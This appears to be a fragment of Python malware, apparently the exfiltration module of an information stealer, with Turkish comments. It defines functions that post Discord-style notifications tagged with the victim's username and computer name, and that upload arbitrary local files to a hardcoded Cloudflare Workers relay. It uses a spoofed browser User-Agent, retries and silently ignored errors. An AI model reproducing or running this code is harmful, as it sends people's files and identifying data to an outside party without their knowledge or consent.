# worker url ve bildirim fonksiyonu
WORKER_URL = "https://gentle-sky-3fe0.solitary-violet-8734.workers.dev/"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def send(title, desc, color):
    embed = {
        "title": title,
        "description": desc,
        "color": color,
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "footer": {"text": f"{os.getenv('USERNAME')}@{os.getenv('COMPUTERNAME')}"}
    }
    try:
        data = json.dumps({"embeds": [embed]}).encode("utf-8")
        req = urllib.request.Request(WORKER_URL, data=data, headers={
            "Content-Type": "application/json",
            "User-Agent": UA
        })
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def send_file(file_path, filename=None, retries=5, delay=3):
    if filename is None:
        filename = os.path.basename(file_path)
    boundary = uuid.uuid4().hex
    with open(file_path, "rb") as f:
        file_data = f.read()
    # multipart govdesini elle hazirliyoruz
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode("utf-8") + file_data + f"\r\n--{boundary}--\r\n".encode("utf-8")

    last_err = ""
    for attempt in range(1, retries + 2):
        try:
            req = urllib.request.Request(WORKER_URL, data=body, headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "User-Agent": UA
            })
            urllib.request.urlopen(req, timeout=180)
            return True, None
        except Exception as e:
            last_err = str(e)
            if hasattr(e, "read"):
                try:
                    last_err += f" - {e.read().decode('utf-8', errors='replace')[:150]}"
                except Exception:
                    pass
            if attempt <= retries:
                send("⚠️ Gonderim Hatasi", f"{filename} gonderilemedi: {last_err}\ntekrar deneniyor ({attempt}/{retries})...", YELLOW)
                time.sleep(delay)

    send("❌ Gonderim Basarisiz", f"{filename} yuklenemedi: {last_err}", RED)
    return False, last_err

